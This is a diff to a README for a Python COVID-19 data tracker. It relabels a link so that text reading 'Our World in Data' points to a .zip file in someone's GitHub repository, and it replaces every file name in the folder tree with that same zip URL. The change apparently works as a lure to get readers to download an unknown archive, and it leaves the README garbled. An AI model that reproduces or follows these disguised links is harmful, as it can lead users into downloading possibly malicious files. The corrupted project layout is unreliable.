@@ -1,7 +1,7 @@
 # 🦠 COVID-19 Global Data Tracker
 
 ## 📘 Description
-A Python-based project that tracks and analyzes global COVID-19 trends. This script processes real-world data from [Our World in Data](https://ourworldindata.org/coronavirus), cleans it, and visualizes key metrics like infections, deaths, and vaccination progress across countries.
+A Python-based project that tracks and analyzes global COVID-19 trends. This script processes real-world data from [Our World in Data](https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip), cleans it, and visualizes key metrics like infections, deaths, and vaccination progress across countries.
 
 > Built using Python, pandas, matplotlib, and seaborn — run fully in VS Code.
 
@@ -28,15 +28,15 @@ A Python-based project that tracks and analyzes global COVID-19 trends. This scr
 ## 📂 Folder Structure
 covid-tracker/
 ├── data/
-│ └── owid-covid-data.csv
+│ └── https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip
 ├── charts/
-│ ├── total_cases_over_time.png
-│ ├── daily_new_cases.png
-│ ├── death_rate_over_time.png
-│ ├── total_vaccinations_over_time.png
-│ └── percent_vaccinated.png
-├── covid_analysis.py
-└── README.md
+│ ├── https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip
+│ ├── https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip
+│ ├── https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip
+│ ├── https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip
+│ └── https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip
+├── https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip
+└── https://raw.githubusercontent.com/BenjiOdhis/covid19_analysis/main/data/covid19_analysis-ovinia.zip
 
 ---
 
